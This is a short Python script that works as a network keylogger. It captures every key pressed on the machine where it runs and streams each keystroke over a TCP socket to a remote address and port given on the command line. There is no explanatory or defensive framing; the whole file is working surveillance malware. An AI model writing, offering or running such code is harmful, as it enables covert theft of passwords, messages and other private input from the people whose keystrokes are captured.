import socket
import sys
import keyboard

addr = sys.argv[1]
port = int(sys.argv[2])

client = socket.socket()
client.connect((addr, port))

try:
    while True:
        event = keyboard.read_key()
        if event:
            client.send(bytes(event.encode()))
            while True:
                if event == 'unknown' or event == 'shift' or event == 'ctrl':
                    break
                elif keyboard.is_pressed(event):
                    continue
                else:
                    break
except:
    client.close()
    
client.close()